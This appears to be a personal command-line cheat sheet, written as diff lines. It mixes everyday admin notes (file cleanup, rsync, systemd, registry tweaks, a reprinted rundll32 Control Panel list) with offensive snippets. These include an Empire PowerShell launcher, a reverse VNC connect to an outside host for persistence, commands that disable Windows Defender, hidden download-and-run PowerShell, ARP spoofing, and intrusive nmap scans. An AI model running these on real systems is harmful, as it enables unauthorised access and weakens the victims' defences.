+dxdiag /dontskip /whql:off /64bit /t c:\dxdiag.txt
+systeminfo >> c:\dxdiag.txt
+
+# empire new syntax 
+./reset.sh
+listeners
+uselistener http_com
+set Port 143
+execute
+launcher powershell http_com
+
+ 
+
+#SSH keys in 2 easy steps
+ssh-keygen
+cat ~/.ssh/id_rsa.pub | ssh remote_user@remote.example.com "cat >> ~/.ssh/authorized_keys"
+
+#remove sample files
+find /media/data/TV /media/data/MOVIES /media/moredata/MOVIES -iname "*sample*" -exec rm -f '{}' \;
+
+# remove all files but what is in the whitelist (DANGER DO NOT RUN THIS ON THE WRONG PATH)
+find /media/data/TV /media/data/MOVIES /media/moredata/MOVIES -regextype egrep -type f ! -iregex '.*\.(avi|mpg|mov|flv|wmv|asf|mpeg|m4v|divx|mp4|mkv|sub|iso|264|vob|srt|img)$' -exec rm -Rf '{}' \;
+
+# remove empty folders (DANGER DO NOT RUN THIS ON THE WRONG PATH)
+find /media/data/TV /media/data/MOVIES /media/moredata/MOVIES -depth -empty -type d -exec  rmdir {} \;
+
+
+
+# todo ... find randomly named files and name them the name of the parrent folder .
+# ./Real.Movie.Name.Here.2017/gfaslrinaoenadftravaa.mkv
+# becomes
+# ./Real.Movie.Name.Here.2017/Real.Movie.Name.Here.2017.mkv
+
+# display files likly to be random but dont delete them
+# this sucks find /media/data/TV /media/data/MOVIES /media/moredata/MOVIES -regextype egrep -type f  -iregex '.*\.(avi|mpg|mov|flv|wmv|asf|mpeg|m4v|divx|mp4|mkv|iso|264|vob|img)$' |  egrep '.*\/([A-Z])\w+\....$'
+
+
+
+#fix random file names to parrent folder W00T sure there is a way to do this with regex/find but not sure ...
+# fixed to escape to single quotes
+# fixed to add  missing forward  slash
+find /media/data/MOVIES/ |grep -E "([A-Z|a-z|0-9]{17,30})" | sed -r 's/(\/media\/data\/MOVIES\/)(.*)(\/.*)(\....)/mv '\''\1\2\3\4'\''  '\''\1\2\/\2\4'\''/g'  > tmp
+
+bash -x tmp
+
+
+
+
+
+
+#disable update urls for all chrome extensions ( this is for annoying plugins that update too often and protects against watering hole attacks! )
+find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_url\": \"hxxp/g' -i.bak '{}' \;
+
+
+# find lossy mp3's finds less then 192 basically .. 
+find AUSTIN/ .  -type f -iname "*.mp3"  -print0|xargs -0 -n1 file|perl -e 'for(<stdin>){/(.*mp3).*?(\d+) kbps/;print "$1 $2\n" if ($2<192);}' > txt.txt
+# cats and just shows the path/count 
+cat txt.txt | sed -r 's/(^.*\/\b)(.*)/\1/g' | uniq -c | sort -rn
+
+
+# create a bunch of interfaces and get a IP for them to do scans though :P
+for i in `seq 1 9`
+do
+
+ip link add link enp0s25 address 00:11:11:11:11:0$i enp0s25.$i type macvlan
+
+sleep 1
+dhclient enp0s25.$i
+done
+
+
+# nmap vuln scanner WIP
+nmap -vv -d1 -sV  --script-args=unsafe=1 --script-args=unsafe  --script "(auth or brute or discovery or exploit or external or fuzzer or intrusive or malware or safe or version or vuln) and not (smb-brute or http-slowloris or http-brute or http-enum or http-form-fuzzer or broadcast-avahi-dos or smb-flood or dns-fuzz or http-form-brute or http-iis-short-name-brute or http-fileupload-exploiter or http-fileupload-exploiter or dos or http-unsafe-output-escaping)" 
+ 
+
+
+rem get the sids dump sids in 
+for /f "tokens=8 delims=\ " %%i IN ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"') do (
+set "a=HKEY_USERS\%%i\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\"
+set b=company.harepoint.com
+reg add "%a%%b%" /v http /t REG_DWORD /d 2 /f  2> %temp%/null
+reg add "%a%%b%" /v https /t REG_DWORD /d 2 /f    2> %temp%/null
+)
+
+
+
+net use /del p:
+net use p: "https://company.sharepoint.com/Audit & Compliance/Shared Documents/"
+
+
+
+
+
+# quick check site 
+https://www.siteuptime.com/users/quickcheck.php?HostName=p48sec04.paymetric.com&Domain=&Content=&ServiceId=9&Locations%5B1%5D=on&Locations%5B4%5D=on&Locations%5B13%5D=on&Action=Check
+
+# ssl cert database
+https://crt.sh/?q=%25.rmccurdy.com
+
+# google drive hosted massive recon database
+https://www.censys.io/ipv4?q=paymetric.com
+
+
+
+# borg backup prune
+borg prune -v --list --keep-within=30d /media/backup/ROOT/ -n
+
+# Mount 365 share over SMB https 
+set "a=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\"
+set b=company.sharepoint.com
+reg add "%a%%b%" /v http /t REG_DWORD /d 2 /f >nul 2>nul
+reg add "%a%%b%" /v https /t REG_DWORD /d 2 /f >nul 2>nul
+
+#reboot 
+
+net use p: "https://company.sharepoint.com/Audit%20%26%20Compliance/Shared%20Documents/"
+
+
+# safe mode
+
+Safe Mode with Networking:
+bcdedit /set {default} safeboot network
+
+Once Command Prompt is open, execute this command:
+bcdedit /deletevalue {default} safeboot
+
+# windows update broken
+REG ADD â€œHKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AUâ€ /v UseWUServer /t REG_DWORD /d 0 /f
+net stop â€œWindows Updateâ€
+net start â€œWindows Updateâ€
+
+# disable IPV6 mostly ...
+reg add HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters /v DisabledComponents /t REG_DWORD /d 0x000000FF
+netsh interface ipv6 set global ramonizeidentifers=disable
+netsh interface ipv6 set privacy state=disable
+
+# derp
+
+@adon90 I just use lajit bins like VNC winvnc -autoreconnect -id:%ID% -connect tunnel.rmccurdy.com::3389 -run
+or powershell for the lulz http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html
+that's old but you get the point DNS tunnels always work for init all persistence you can go with NPS.zip if powershell is blocked https://github.com/Ben0xA/nps  or try puppy https://github.com/n1nj4sec/pupy
+
+
+# nmap breakout @mubix brakesec slack
+letmeoutofyour.net
+
+# some curl fu I ended up not using uses gzip and finds the highest value line 
+curl --compressed -i -s -k  -X $'GET'     -H $'Host: 25.0.0.151' -H $'Accept-Encoding: gzip, deflate'      $'http://25.0.0.151/zm/index.php?view=events&page=&reload=0&execute=0&action=&subaction=&line=&fid=&filterName=WIPEALLEVENTS&filter%5Bterms%5D%5B0%5D%5Battr%5D=DateTime&filter%5Bterms%5D%5B0%5D%5Bop%5D=%3C&filter%5Bterms%5D%5B0%5D%5Bval%5D=now&sort_field=DateTime&sort_asc=1&limit=&AutoExecuteCmd=' | grep "colTotScore\">[0-9]" | sed -r 's/(.*ore\">)(.*)(<\/td>)/\2/g'  | awk '{if(max<$1){max=$1;line=$1}}END{print line}'
+
+# Chrome Plugins ... Really .. no way to restore plugins at all ...
+
+Chrome Plugins:
+
+https://chrome.google.com/webstore/detail/pkehgijcmpdhfbdbbnkijodmdjhbjlgp
+https://chrome.google.com/webstore/detail/ghnomdcacenbmilgjigehppbamfndblo
+https://chrome.google.com/webstore/detail/ghbmnnjooekpmoecnnnilnnbdlolhkhi
+https://chrome.google.com/webstore/detail/apdfllckaahabafndbhieahigkjlhalf
+https://chrome.google.com/webstore/detail/lmjegmlicamnimmfhcmpkclmigmmcbeh
+https://chrome.google.com/webstore/detail/pbjikboenpfhbbejgkoklgkhjpfogcam
+https://chrome.google.com/webstore/detail/gnaepfhefefonbijmhcmnfjnchlcbnfc
+https://chrome.google.com/webstore/detail/kemfccojgjoilhfmcblgimbggikekjip
+https://chrome.google.com/webstore/detail/nbkekaeindpfpcoldfckljplboolgkfm
+https://chrome.google.com/webstore/detail/nckgahadagoaajjgafhacjanaoiihapd
+https://chrome.google.com/webstore/detail/ffhkkpnppgnfaobgihpdblnhmmbodake
+https://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm
+https://chrome.google.com/webstore/detail/hdokiejnpimakedhajhdlcegeplioahd
+https://chrome.google.com/webstore/detail/odldmflbckacdofpepkdkmkccgdfaemb
+https://chrome.google.com/webstore/detail/kcnhkahnjcbndmmehfkdnkjomaanaooo
+https://chrome.google.com/webstore/detail/ehfdcgbfcboceiclmjaofdannmjdeaoi
+https://chrome.google.com/webstore/detail/dhdgffkkebhmkfjojejmpbldmpobfkfo
+https://chrome.google.com/webstore/detail/cjpalhdlnbpafiamejdnhcphjbkeiagm
+https://chrome.google.com/webstore/detail/boadgeojelhgndaghljhdicfkmllpafd
+https://chrome.google.com/webstore/detail/abjcfabbhafbcdfjoecdgepllmpfceif
+https://chrome.google.com/webstore/detail/pibndofbpkoaipoidbkephfhhnapkccn
+
+Grease (Tamper) Monkey Scripts:
+
+https://greasyfork.org/en/scripts/735-anti-adblock-killer-reek?lipi=urn%3Ali%3Apage%3Ad_flagship3_pulse_read%3B8BiCR9cxQUi0F11hC370NQ%3D%3D
+https://greasyfork.org/en/scripts/5566-youtube-links
+
+
+
+#aws amazon notes
+https://protoxin.net/s3/
+https://github.com/nccgroup/scout2
+
+https://github.com/dagrz/aws_pwn/blob/master/README.md
+
+#TRONSCRIPT !
+goto https://bmrf.org/repos/tron/ and get the filename of the exe and replace the file name in the url below
+
+#TRONSCRIPT  NO AV !
+goto https://bmrf.org/repos/tron/ and get the filename of the exe and replace the file name in the url below
+
+powershell -NoP -NonI -W Hidden  -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://www.rmccurdy.com/tronscript.exe',\"%userprofile%\desktop\tron.exe\"); Start-Process \"%userprofile%\desktop\tron.exe\" -ArgumentList \"-o%userprofile%\desktop\" -Wait ;Start-Process \"%userprofile%\desktop\tron\tron.bat\" -ArgumentList \"-a   -sa -sd\""
+
+
+# full tronscript RUNS AV !
+powershell -NoP -NonI -W Hidden  -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://www.rmccurdy.com/tronscript.exe',\"%userprofile%\desktop\tron.exe\"); Start-Process \"%userprofile%\desktop\tron.exe\" -ArgumentList \"-o%userprofile%\desktop\" -Wait ;Start-Process \"%userprofile%\desktop\tron\tron.bat\""
+
+
+
+# disable windows defender
+REG add "HKLM\SYSTEM\CurrentControlSet\services\WinDefend" /v Start /t REG_DWORD /d 4 /f
+
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -PropertyType DWord -Value 1 -force
+
+
+rsync git
+
+cd
+apt-get --purge rsync
+apt-get install git automake -y
+
+git clone git://git.samba.org/rsync.git
+
+cd rsync
+./configure
+make
+make install
+
+Now you can have great progress info!
+
+rsync  --info=progress2 SOURCE DST
+
+rsync --info=progress2 --delete -r /media/moredata/BACKUP_DUMP/ /media/backup/BACKUP_DUMP/
+
+man rsync for what Parc options meanï»¿
+ï»¿
+
+
+# auth to ironports :P
+echo 10.4.208.29 ironport9p1 >> /etc/hosts
+curl -i -s -k  -L -X $'GET' -H $'Upgrade-Insecure-Requests: 1' --ntlm --negotiate -u "ugrm245:YOURPASSWORD"   "http://ironport9p1/B0000D0000N0001N0000F0000S0000R0004/"`ip address show | grep '\b10\.' | sed -e 's/.*inet //g' -e 's/\/.*//g'`"/http://go.com/"
+
+
+# tor email
+i'd just create an account at https://protonmail.com/ and use tor browser bundle
+A
+cirrus
+operat0r: try https://protonirockerxow.onion, or http://torbox3uio6wchz.onion, or thereâ€™s also http://bitmailendavkbec.onion (but you need an existing email for that one).
+
+#Enable ICS over command line and powershell ?
+
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Network Connections" /v NC_ShowSharedAccessUI /t reg_dword /d 1 /f
+
+
+powershell 
+regsvr32 hnetcfg.dll
+
+$m = New-Object -ComObject HNetCfg.HNetShare
+$m.EnumEveryConnection |% { $m.NetConnectionProps.Invoke($_) }
+$c = $m.EnumEveryConnection |? { $m.NetConnectionProps.Invoke($_).Name -eq "WIFI" }
+$config = $m.INetSharingConfigurationForINetConnection.Invoke($c)
+Write-Output $config.SharingEnabled
+Write-Output $config.SharingType
+$config.EnableSharing(1)
+
+
+
+$config.DisableSharing()
+
+
+
+
+
+# excel show hperlink URL
+Function GetURL(cell As range, _
+Optional default_value As Variant)
+'Lists the Hyperlink Address for a Given Cell
+'If cell does not contain a hyperlink, return default_value
+If (cell.range("A1").Hyperlinks.Count <> 1) Then
+GetURL = default_value
+Else
+GetURL = cell.range("A1").Hyperlinks(1).Address & "#" & cell.range("A1").Hyperlinks(1).SubAddress
+End If
+End Function
+
+
+
+## heartbleed nmap
+nmap  --script ssl-heartbleed --script-args vulns.showall -sV  -iL in -v --open -d2 | tee out.txt
+egrep "(report for |: VULNERABLE)" -A 2   out.txt
+
+# grep for ip addres and pull it out
+grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
+
+#grep ip address
+grep -iaE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" 
+
+#nmap search for null sessions
+nmap -v -p445 --script=smb-os-discovery -iL in1 -oA in1_smb-os-discovery -d2 -T2 -n -vv | tee -a debug.txt
+grep  "<blank> succeeded" debug.txt | awk '{print $4,$11,$12}' | sort -u | grep succeeded | sort -u
+
+
+# nmap SMB checks
+
+nmap -PS445 -p445 --script=smb-os-discovery,smbv2-enabled,smb-enum-shares,smb-ls --script-args=ls.maxdepth=10 -iL in2_234 -oA in2_234 -vv -d2 -T5
+
+
+# rsync
+a
+
+sync -P --info=progress2 -r -e 'ssh -p 443' plex@25.0.0.151:/media/moredata/BACKUP_DUMP/usb/  ./usb/
+
+
+//## find modded files in the last 7 days and save them to csv
+Get-ChildItem c:\windows\ -recurse -Include *.*| Where{$_.LastWriteTime -gt (Get-Date).AddDays(-7)} | Export-Csv -Path  moddedfiles.csv -Encoding ascii -NoTypeInformation
+
+
+
+#nmap for for windows and smb ls 
+
+nmap -PS445 -p445 --script=smb-os-discovery,smbv2-enabled,smb-enum-shares,smb-ls --script-args=ls.maxdepth=10 10.49.211.99
+
+
+#nikto all in mostly
+
+apt install libnet-ssleay-perl -y
+git clone  https://github.com/sullo/nikto.git
+cd nikto
+cd program
+./nikto.pl -C none -Tuning x02589abc -timeout 1 -host digitalinvoicing.net   -output /tmp/1.csv
+./nikto.pl -C none -Tuning x02589abc -timeout 1 -host digitalinvoicing.net -ssl -port 443 -output /tmp/2.csv
+
+
+
+
+# use nikto though a proxy with verbose output (tested with ZAP )
+./nikto.pl -C none -Tuning x02589abc -timeout 1 -host "http://site12333.com/TERT/" -output 4.csv -Display V -useproxy http://localhost:8080 | tee -a 5
+
+
+#git pull for nmap ...
+
+apt-get update
+apt-get remove --purge nmap -y
+apt-get install libssl-dev automake build-essential  libpcap-dev git -y
+cd /tmp
+rm -Rf /tmp/nmap
+git clone https://github.com/nmap/nmap.git
+cd nmap
+./configure && make install
+
+
+# dns hijack that does not work
+dnsspoof   
+ettercap -T -M ARP /10.50.2.111// /10.0.0.1//
+# hex value of the garget IP 
+iptables --append FORWARD --match string --algo kmp --hex-string '|0a 04 dc 14|' --jump DROP
+
+
+#make other outlook attached mailboxes keep the sent item in the attached mailboxes flder
+Reg add HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Outlook\Preferences /v DelegateSentItemsStyle /t reg_dword /d 1 /f
+
+
+# sudousers file
+update-alternatives --config editor
+
+
+# smbv1 disable
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force
+
+# FTP 
+lftp -c "open 123.456.789.100 && find -l && exit" > listing.txt
+ncftpls -R
+
+
+#LOOKUPS=
+
+=DLookUp("[Asset Names]","[VARTOP]","[SERVERNAME]=[Asset Names]")
+
+IF=
+
+=IIf([Version]<"2016-07-02","Yes",IIf([Version]>"2016-07-02","No",IIf(IsNull([Version]),"Yes","[Version]")))
+
+
+
+# copy random mp3s from /media/data/MUSIC/RTORRENT/ to /s/
+find /media/data/MUSIC/RTORRENT/ -type f -iname "*.mp3" |shuf |head -n 5000 |xargs -d$'\n' -I{} cp -v {} /s/
+  
+# remove files under 1 meg ( likly not MP3's ... ) 
+find /s/ -size -1M -type f -iname "*.mp3" -exec rm '{}' \;
+
+
+# rename all the files to random file names because some wonky file names break mp3 player...
+cd /s/
+IFS=$'\n';for fname in `ls /s/*.mp3`; do mv "$fname" "$RANDOM$RANDOM.mp3" ;done
+
+
+
+
+#systemd sucks
+systemctl enable getty@tty2
+
+cat /etc/systemd/system/getty@tty1.service.d/autologin.conf
+[Service]
+ExecStart=
+ExecStart=-/sbin/agetty -a root --noclear %I linux
+
+
+
+
+cat PLEXPY.service
+[Unit]
+Description=PLEXPY STARTUP
+After=network.target
+
+[Service]
+User=plex
+Group=adm
+
+Type=simple
+ExecStart=/bin/bash -c '\
+cd /home/plex/plexpy  ; \
+git pull -f  ; \
+python PlexPy.py'
+
+
+TimeoutStopSec=99
+
+[Install]
+WantedBy=multi-user.target
+
+
+
+# yay systemd
+export varsystemd=DARKNET.service
+
+systemctl enable $varsystemd
+systemctl daemon-reload
+systemctl stop  $varsystemd
+sleep 2
+systemctl start $varsystemd
+sleep 2
+systemctl status  $varsystemd
+journalctl -f -t  $varsystemd
+
+
+
+
+
+# ALL THE command line stuff for unas control panel
+
+Shelling Control Panel Applets and System Wizards
+Name: Shelling Control Panel Applets and System Wizards
+Author: Karl Peterson
+Date: August 12, 1998
+Level: All
+Credits: Thanks go out to Karl Peterson for allowing me to reprint this useful information. You can find this and other items on his excellent One Stop Source Shop web site.
+
+Shelling Control Panel Applets and System Wizards
+An infrequent but recurring question in online discussion groups goes along the lines of, "How do I call up the Control Panel time/date (substitute wallpaper, mouse, whatever) dialog from VB?" Frequently this is accompanied with wonder about how to force the VB app to wait until the user makes their desired choices and dismisses the dialog. Listed below are all the codes required to call most of the Control Panel applets. I've collected these over the years from various online postings, but since new applets are always being added would appreciate hearing of any you could contribute to grow the list!
+
+Check it out:
+ 
+Use the following snippet to Shell the date/time dialog.
+Substitute the codes below for other Control Panel dialogs.
+
+   Option Explicit
+   
+   Private Sub SetDateTime()
+      Call Shell("rundll32.exe shell32.dll,Control_RunDLL timedate.cpl")
+   End Sub
+
+Couldn't be much easier, could it? The only trick is knowing the "secret code" for each dialog. Now, while the above will bring up the date/time dialog, your VB app will have no way of knowing when that dialog has been dismissed. For the answer to that, go to my Samples page and download Shell32.zip which shows several methods you can use to "shell and wait."
+
+So, what are the secret codes? Here ya go...
+
+Control Panel (CONTROL.EXE)
+Control Panel:
+
+    rundll32.exe shell32.dll,Control_RunDLL
+
+Accessability Settings (ACCESS.CPL)
+Accessability Properties (Keyboard):
+
+    rundll32.exe shell32.dll,Control_RunDLL access.cpl,,1
+
+Accessability Properties (Sound):
+
+    rundll32.exe shell32.dll,Control_RunDLL access.cpl,,2
+
+Accessability Properties (Display):
+
+    rundll32.exe shell32.dll,Control_RunDLL access.cpl,,3
+
+Accessability Properties (Mouse):
+
+    rundll32.exe shell32.dll,Control_RunDLL access.cpl,,4
+
+Accessability Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL access.cpl,,5
+
+Add/Remove Programs (APPWIZ.CPL)
+Add/Remove Programs Properties (Install/Uninstall):
+
+    rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,1
+
+Add/Remove Programs Properties (Windows Setup):
+
+    rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,2
+
+Add/Remove Programs Properties (Startup Disk):
+
+    rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,3
+
+Display Settings (DESK.CPL)
+Display Properties (Background):
+
+    rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0
+
+Display Properties (Screen Saver):
+
+    rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1
+
+Display Properties (Appearance):
+
+    rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,2
+
+Display Properties (Settings):
+
+    rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,3
+
+Display Properties (Install Screen Saver):
+
+    rundll32.exe desk.cpl,InstallScreenSaver %1
+    (opens .scr at location specified by %1 in preview window)
+
+FindFast Settings (FINDFAST.CPL)
+Find Fast Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL findfast.cpl
+
+Internet Settings (INETCPL.CPL)
+Internet Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0
+
+Internet Properties (Security):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,1
+
+Internet Properties (Content):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,2
+
+Internet Properties (Connection):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,3
+
+Internet Properties (Programs):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,4
+
+Internet Properties (Advanced):
+
+    rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,5
+
+Regional Settings (INTL.CPL)
+Regional Settings Properties (Regional Settings):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0
+
+Regional Settings Properties (Number):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,1
+
+Regional Settings Properties (Currency):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,2
+
+Regional Settings Properties (Time):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,3
+
+Regional Settings Properties (Date):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,4
+
+Regional Settings Properties (Input Locales):
+
+    rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,5
+
+Joystick Settings (JOY.CPL)
+Joystick Properties (Joystick):
+
+    rundll32.exe shell32.dll,Control_RunDLL joy.cpl
+
+Mouse/Keyboard/Printers/Fonts Settings (MAIN.CPL)
+Mouse Properties:
+
+    rundll32.exe shell32.dll,Control_RunDLL main.cpl @0
+
+Keyboard Properties:
+
+    rundll32.exe shell32.dll,Control_RunDLL main.cpl @1
+
+Printers:
+
+    rundll32.exe shell32.dll,Control_RunDLL main.cpl @2
+
+Fonts:
+
+    rundll32.exe shell32.dll,Control_RunDLL main.cpl @3
+
+Mail and Fax Settings (MLCFG32.CPL)
+Microsoft Exchange/Outlook Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL mlcfg32.cpl
+
+Multimedia/Sounds Settings (MMSYS.CPL)
+Multimedia Properties (Audio):
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,0
+
+Multimedia Properties (Video):
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,1
+
+Multimedia Properties (MIDI):
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,2
+
+Multimedia Properties (CD Music):
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,3
+
+Multimedia Properties (Advanced/Devices):
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,4
+
+Sounds Properties:
+
+    rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl @1
+
+Modem Settings (MODEM.CPL)
+Modem Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL modem.cpl
+
+Network Settings (NETCPL.CPL / NCPA.DLL)
+Network (Configuration):
+
+    Win9x: rundll32.exe shell32.dll,Control_RunDLL netcpl.cpl
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL ncpa.cpl
+
+Dial-up Networking Wizard
+
+    Win9x: rundll32.exe rnaui.dll,RnaWizard
+
+Create Share Dialog
+
+    WinNT: rundll32.exe ntlanui.dll,ShareCreate
+
+Manage Shares Dialog
+
+    WinNT: rundll32.exe ntlanui.dll,ShareManage
+
+ODBC Settings (ODBCCP32.CPL)
+ODBC Data Source Administrator (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL odbccp32.cpl
+
+Password Settings (PASSWORD.CPL)
+Password Properties (Change Passwords):
+
+    Win9x: rundll32.exe shell32.dll,Control_RunDLL password.cpl
+
+COM Ports Settings (PORTS.CPL)
+COM Ports Properties (General):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL ports.cpl
+
+Server Properties (SRVMGR.CPL)
+Server Properties (General):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL srvmgr.cpl
+
+System Settings (SYSDM.CPL)
+System Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,0
+
+System Properties (Device Manager):
+
+    Win9x: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,1
+
+System Properties (Performance):
+
+    Win9x: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,3
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,1
+
+System Properties (Environment):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,2
+
+System Properties (Startup/Shutdown):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,3
+
+System Properties (Hardware Profiles):
+
+    Win95: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,2
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,4
+
+System Properties (User Profiles):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl,,5
+
+Add New Hardware Wizard:
+
+    Win9x: rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl @1
+
+Add New Printer Wizard:
+
+    Win9x: rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter
+
+Telephony Settings (TELEPHON.CPL)
+Dialing Properties (My Location / Drivers):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL telephon.cpl
+
+Themes Settings (THEMES.CPL)
+Themes Properties (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL themes.cpl
+
+Time and Date Settings (TIMEDATE.CPL)
+Date/Time Properties:
+
+    rundll32.exe shell32.dll,Control_RunDLL timedate.cpl
+
+Choose Time Zone:
+
+    rundll32.exe shell32.dll,Control_RunDLL timedate.cpl,,/f
+
+TweakUI Settings (TWEAKUI.CPL)
+TweakUI Dialog (General):
+
+    rundll32.exe shell32.dll,Control_RunDLL tweakui.cpl
+
+UPS Settings (UPS.CPL)
+Uninteruptable Power Supply Properties (General):
+
+    WinNT: rundll32.exe shell32.dll,Control_RunDLL ups.cpl
+
+Microsoft Mail Postoffice Settings (WGPOCPL.CPL)
+Microsoft Workgroup Postoffice Admin:
+
+    rundll32.exe shell32.dll,Control_RunDLL wgpocpl.cpl
+
+Miscellaneous File System Dialogs and Wizards
+Open With (File Associations):
+
+    rundll32.exe shell32.dll,OpenAs_RunDLL d:\path\filename.ext
+
+Run Diskcopy Dialog:
+
+    rundll32 diskcopy.dll,DiskCopyRunDll
+
+Create New Shortcut Wizard:
+
+    rundll32.exe AppWiz.Cpl,NewLinkHere %1
+    (creates shortcut at location specified by %1)
+
+Create a Briefcase:
+
+    rundll32.exe syncui.dll,Briefcase_Create
+
+View Fonts:
+
+    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL FontsFolder
+
+View Printers:
+
+    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL PrintersFolder
+
+I've also posted a text version of this information which you may find handy (you can find shellcpl.txt on Karl's site).
+
+Again, please send me an e-mail if you find any additional codes that I could add to this list!
+Copyright Â©1995-98, Karl E. Peterson, All Rights Reserved Worldwide
+
+
+
+#wget ...NOT
+aria2c --file-allocation=none -c -x 4 -s 4 -d "./" "$1"
+
+
+# powershell 
+PowerShell -ExecutionPolicy ByPass -file Policy_Script_powershell.txt
+
+2. Set-ExecutionPolicy Unrestricted Or Set-ExecutionPolicy RemoteSigned
+
+
+# block re-tweets twitter block from debug console for firefox
+https://twitter.com/operat0r/following
+
+a=Array.prototype.slice.call(document.querySelectorAll("div.ProfileCard-content div.dropdown"));
+a.forEach(function(e) {e.querySelector("button").click(); e.querySelector("li.retweet-off-text button").click(); })
+
+
+# psexec new hotness
+https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html
+
+# skip fstab errors on boot it also looks like you can use 'auto' insted of ext4
+
+/dev/sdb1    /media/4TB_B ext4    defaults,nobootwait    0    1
+/dev/sdc1    /media/1TB ext4    defaults,nobootwait    0    1
+
+# dump users 
+import-module activedirectory
+get-aduser -ldapfilter "(&(&(samaccountname=*)(useraccountcontrol=512)))"  -Properties  * |select name,givenname, sn,enabled,EmailAddress,AccountExpirationdate,"passwordlastset" | export-csv -path c:\test.csv
+start c:\test.csv
+
+# pull the MAC from dump and split it up for use with nmap-mac-prefixes  replace  54:B6:20:00:00:00  with  54B620 000000 
+sed -r "s/(..):(..):(..):(..):(..):(..)/\1\2\3 \4\5\6/g"
+cat ../../nmap-mac-prefixes | sed -r "s/(......) /\1,/g" > ../../nmap-mac-pre
+fixes.csv 
+
+
+#Want to turn off Retweets from all users you're following without clicking each time? This script sorts that, using a timer to avoid your requests being blocked and returning a 403. Scroll to the bottom of your Following list, paste it into Chrome's console
+
+a=Array.prototype.slice.call(document.querySelectorAll("div.ProfileCard-content div.dropdown"));
+a.forEach(function(e) {e.querySelector("button").click(); e.querySelector("li.retweet-off-text button").click(); })
+
+var interval=setInterval(function(){
+  $('.user-actions.including .retweet-off-text').last().click();
+  if ($('.user-actions.including .retweet-off-text').length<1) {
+    clearInterval(interval);
+  }
+},20000);
+
+
+# ugh unicornscan.. udp fast
+unicornscan -mU -Ir 1000 20.0.0.1:a -v
+
+#john 1337 some place on VM's john.conf file .. ?
+
+l /a /e /l /o /s sa4 se3 sl[1|] so0 ss5
+l /a /e /l /o /s sa@ se3 sl1 so0 ss[$5]
+
